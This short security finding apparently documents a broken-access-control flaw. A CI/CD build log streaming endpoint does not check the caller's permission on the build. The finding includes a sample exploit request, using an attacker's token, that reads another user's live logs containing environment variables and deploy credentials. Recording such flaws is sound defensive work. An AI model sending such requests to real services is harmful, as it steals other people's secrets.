diagnosis: The route initiates an EventSourceResponse to stream live execution logs of a CI/CD build container without verifying that the build job belongs to a repository or organization current_user has read permissions for. An attacker can stream stdout/stderr logs containing environment variables and deploy credentials of other users' builds.
exploit_request:
GET /api/v1/builds/bld_prod_deploy_9941/live-logs HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Accept: text/event-stream
